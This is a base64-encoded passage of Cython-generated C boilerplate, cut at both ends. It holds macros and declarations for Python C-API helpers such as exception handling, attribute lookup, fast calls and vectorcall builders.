UoUHlUaHJlYWRTdGF0ZV9HRVQoKSwgdHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTZcbiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIChQeV9JTkNSRUYoZXhjKSwgX19QeXhfRXJyUmVzdG9yZSgoZXhjKSwgTlVMTCwgTlVMTCkpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpXG4jZW5kaWZcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgUHlFcnJfQ2xlYXIoKVxuI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpXG4jZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobyxuKSBQeU9iamVjdF9HZXRBdHRyKG8sbilcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMaXN0X0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTtcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pO1xuI2VuZGlmXG5cblxuI2luY2x1ZGUgPHN0cmluZy5oPlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscyk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpO1xuXG5cbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGFyZ3MsIGkpXG4jZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9OZXdSZWYoX19QeXhfUHlUdXBsZV9HRVRfSVRFTShhcmdzLCBpKSlcbiNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9YTmV3UmVmKFB5VHVwbGVfR2V0SXRlbShhcmdzLCBpKSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfVkFSQVJHUyhrd2RzKSBQeURpY3RfU2l6ZShrd2RzKVxuI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKGFyZ3MsIG5hcmdzKSBOVUxMXG4jZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHUyhrdywga3d2YWx1ZXMsIHMpIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGt3LCBzKVxuI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfVkFSQVJHUyhrdywga3d2YWx1ZXMpIFB5RGljdF9Db3B5KGt3KVxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoYXJncywgaSkgX19QeXhfTmV3UmVmKGFyZ3NbaV0pXG4gICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoa3dkcykgX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd2RzKVxuICAgICNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoYXJncywgbmFyZ3MpICgoYXJncykgKyAobmFyZ3MpKVxuICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIENZVEhPTl9VTlVTRUQgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMpO1xuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKGt3LCBrd3ZhbHVlcykgX1B5U3RhY2tfQXNEaWN0KGt3dmFsdWVzLCBrdylcbiAgI2VuZGlmXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX0ZBU1RDQUxMIF9fUHl4X0FyZ1JlZl9WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwgX19QeXhfTnVtS3dhcmdzX1ZBUkFSR1NcbiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMIF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1NcbiAgICAjZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwgX19QeXhfR2V0S3dWYWx1ZV9WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwgX19QeXhfS3dhcmdzQXNEaWN0X1ZBUkFSR1NcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfVkFSQVJHUyhhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcClcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKVxuI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfRkFTVENBTEwoYXJncywgc3RhcnQsIHN0b3ApIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KGFyZ3MgKyBzdGFydCwgc3RvcCAtIHN0YXJ0KVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX0ZBU1RDQUxMKGFyZ3MsIHN0YXJ0LCBzdG9wKSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIHN0YXJ0LCBzdG9wKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiNkZWZpbmUgX19QWVhfRElDVF9WRVJTSU9OX0lOSVQgICgoUFlfVUlOVDY0X1QpIC0xKVxuI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoKChQeURpY3RPYmplY3QqKShkaWN0KSktPm1hX3ZlcnNpb25fdGFnKVxuI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcilcXFxuICAgICh2ZXJzaW9uX3ZhcikgPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpO1xcXG4gICAgKGNhY2hlX3ZhcikgPSAodmFsdWUpO1xuI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkge1xcXG4gICAgc3RhdGljIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbiA9IDA7XFxcbiAgICBzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gTlVMTDtcXFxuICAgIGlmIChsaWtlbHkoX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihESUNUKSA9PSBfX3B5eF9kaWN0X3ZlcnNpb24pKSB7XFxcbiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZTtcXFxuICAgIH0gZWxzZSB7XFxcbiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IChMT09LVVApO1xcXG4gICAgICAgIF9fcHl4X2RpY3RfdmVyc2lvbiA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oRElDVCk7XFxcbiAgICB9XFxcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF90cF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9vYmplY3RfZGljdF92ZXJzaW9uX21hdGNoZXMoUHlPYmplY3QqIG9iaiwgUFlfVUlOVDY0X1QgdHBfZGljdF92ZXJzaW9uLCBQWV9VSU5UNjRfVCBvYmpfZGljdF92ZXJzaW9uKTtcbiNlbHNlXG4jZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgwKVxuI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcilcbiNkZWZpbmUgX19QWVhfUFlfRElDVF9MT09LVVBfSUZfTU9ESUZJRUQoVkFSLCBESUNULCBMT09LVVApICAoVkFSKSA9IChMT09LVVApO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgIGRvIHtcXFxuICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1xcXG4gICAgc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IE5VTEw7XFxcbiAgICAodmFyKSA9IChsaWtlbHkoX19weXhfZGljdF92ZXJzaW9uID09IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCkpKSA/XFxcbiAgICAgICAgKGxpa2VseShfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSkgPyBfX1B5eF9OZXdSZWYoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpIDogX19QeXhfR2V0QnVpbHRpbk5hbWUobmFtZSkpIDpcXFxuICAgICAgICBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lLCAmX19weXhfZGljdF92ZXJzaW9uLCAmX19weXhfZGljdF9jYWNoZWRfdmFsdWUpO1xcXG59IHdoaWxlKDApXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWVVbmNhY2hlZCh2YXIsIG5hbWUpICBkbyB7XFxcbiAgICBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb247XFxcbiAgICBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XFxcbiAgICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUsICZfX3B5eF9kaWN0X3ZlcnNpb24sICZfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSk7XFxcbn0gd2hpbGUoMClcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUsIFBZX1VJTlQ2NF9UICpkaWN0X3ZlcnNpb24sIFB5T2JqZWN0ICoqZGljdF9jYWNoZWRfdmFsdWUpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZSh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWVVbmNhY2hlZCh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdyk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdylcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXFxcbiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcXFxuICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpXG4jZWxpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXFxcbiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcXFxuICAgICAgICBsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QocykpID8gUHlMb25nX1R5cGUudHBfcmVwcihzKSA6XFxcbiAgICAgICAgbGlrZWx5KFB5RmxvYXRfQ2hlY2tFeGFjdChzKSkgPyBQeUZsb2F0X1R5cGUudHBfcmVwcihzKSA6XFxcbiAgICAgICAgUHlPYmplY3RfRm9ybWF0KHMsIGYpKVxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXFxcbiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcXFxuICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpXG4jZW5kaWZcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Kb2luKFB5T2JqZWN0KiogdmFsdWVzLCBQeV9zc2l6ZV90IHZhbHVlX2NvdW50LCBQeV9zc2l6ZV90IHJlc3VsdF91bGVuZ3RoLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9VQ1M0IG1heF9jaGFyKTtcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4jaWYgIUNZVEhPTl9WRUNUT1JDQUxMXG4jZGVmaW5lIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGwoZnVuYywgYXJncywgbmFyZ3MpXFxcbiAgICBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdCgoZnVuYyksIChhcmdzKSwgKG5hcmdzKSwgTlVMTClcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoY29uZClcXFxuICAgIChzaXplb2YoY2hhciBbMSAtIDIqIShjb25kKV0pIC0gMSlcbiNpZm5kZWYgUHlfTUVNQkVSX1NJWkVcbiNkZWZpbmUgUHlfTUVNQkVSX1NJWkUodHlwZSwgbWVtYmVyKSBzaXplb2YoKCh0eXBlICopMCktPm1lbWJlcilcbiNlbmRpZlxuI2lmICFDWVRIT05fVkVDVE9SQ0FMTFxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiXG4gICNkZWZpbmUgX19QeHlfUHlGcmFtZV9Jbml0aWFsaXplX09mZnNldHMoKVxuICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSkgICgoZnJhbWUpLT5mX2xvY2Fsc3BsdXMpXG4jZWxzZVxuICBzdGF0aWMgc2l6ZV90IF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQgPSAwO1xuICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCJcbiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpXFxcbiAgICAoKHZvaWQpX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoc2l6ZW9mKFB5RnJhbWVPYmplY3QpID09IG9mZnNldG9mKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykgKyBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpKSxcXFxuICAgICAodm9pZCkoX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCA9ICgoc2l6ZV90KVB5RnJhbWVfVHlwZS50cF9iYXNpY3NpemUpIC0gUHlfTUVNQkVSX1NJWkUoUHlGcmFtZU9iamVjdCwgZl9sb2NhbHNwbHVzKSkpXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9HZXRMb2NhbHNwbHVzKGZyYW1lKVxcXG4gICAgKGFzc2VydChfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0KSwgKFB5T2JqZWN0ICoqKSgoKGNoYXIgKikoZnJhbWUpKSArIF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQpKVxuI2VuZGlmXG4jZW5kaWZcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpO1xuI2VuZGlmXG5cblxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzLCBuYXJncykgIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KShuYXJncyksIE5VTEwpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7XG5cblxuI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QobmFtZSwgYXJncywgbmFyZ3NmKSBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG5hbWUsIGFyZ3MsIG5hcmdzZiwgTlVMTClcbiNlbHNlXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YpO1xuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoUHlPYmplY3QqIGxpc3QsIFB5T2JqZWN0KiB4KSB7XG4gICAgUHlMaXN0T2JqZWN0KiBMID0gKFB5TGlzdE9iamVjdCopIGxpc3Q7XG4gICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpO1xuICAgIGlmIChsaWtlbHkoTC0+YWxsb2NhdGVkID4gbGVuKSkge1xuICAgICAgICBQeV9JTkNSRUYoeCk7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBMLT5vYl9pdGVtW2xlbl0gPSB4O1xuICAgICAgICAjZWxzZVxuICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIF9fUHl4X1NFVF9TSVpFKGxpc3QsIGxlbiArIDEpO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIFB5TGlzdF9BcHBlbmQobGlzdCwgeCk7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoTCx4KSBQeUxpc3RfQXBwZW5kKEwseClcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfR2V0RXhjZXB0aW9uKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19HZXRFeGNlcHRpb24oX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfR2V0RXhjZXB0aW9uKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pO1xuXG5cbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVW5pY29kZShvYmopXFxcbiAgICAobGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeU9iamVjdF9TdHIob2JqKSlcblxuXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pO1xuI2lmIENZVEhPTl9WRUNUT1JDQUxMXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgUHlPYmplY3RfVmVjdG9yY2FsbFxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9QeU9iamVjdF9WZWN0b3JjYWxsXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcyhuKSBQeVR1cGxlX05ldyhuKVxuc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7XG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdFxuI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKVxuI2RlZmluZSBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoa2V5LCB2YWx1ZSwgYn